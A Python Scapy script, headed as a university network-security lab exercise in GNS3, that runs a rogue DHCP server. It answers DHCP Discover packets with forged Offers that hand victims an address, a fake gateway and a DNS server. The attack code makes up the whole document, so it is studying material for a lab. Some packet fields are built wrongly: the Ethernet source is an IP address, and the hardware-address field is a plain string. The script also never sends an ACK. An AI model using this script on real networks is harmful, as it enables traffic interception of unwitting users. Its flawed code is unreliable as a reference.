# -*- coding: utf-8 -*-
"""
Laboratorio de Seguridad en Redes
Ataque DHCP Spoofing
Escenario: Router c7200 (10.24.62.1/24), Kali Linux atacante (10.24.62.2/24),
y máquina víctima conectados a través de un switch en GNS3.
Autor: Gregory
Matrícula: [2024-1462]
"""

from scapy.all import *

# Configuración del servidor DHCP falso
fake_server_ip = "10.24.62.2"   # Kali atacante
fake_gateway_ip = "10.24.62.254" # Gateway falso
fake_dns_ip = "8.8.8.8"         # DNS falso (ejemplo)
lease_time = 3600               # Tiempo de concesión en segundos

def dhcp_offer(pkt):
    """
    Responde a un DHCP Discover con un DHCP Offer falso.
    """
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
        client_mac = pkt[Ether].src
        offered_ip = "10.24.62.100"  # IP falsa para la víctima

        ether = Ether(src=fake_server_ip, dst=client_mac)
        ip = IP(src=fake_server_ip, dst="255.255.255.255")
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=fake_server_ip,
                      chaddr=client_mac.replace(":", ""))
        dhcp = DHCP(options=[
            ("message-type", "offer"),
            ("server_id", fake_server_ip),
            ("router", fake_gateway_ip),
            ("name_server", fake_dns_ip),
            ("lease_time", lease_time),
            "end"
        ])

        offer = ether / ip / udp / bootp / dhcp
        sendp(offer, iface="eth0", verbose=False)
        print(f"[*] DHCP Offer enviado a {client_mac} con IP {offered_ip}")

def main():
    print("[*] Iniciando servidor DHCP falso en Kali...")
    sniff(filter="udp and (port 67 or 68)", prn=dhcp_offer, iface="eth0")

if __name__ == "__main__":
    main()
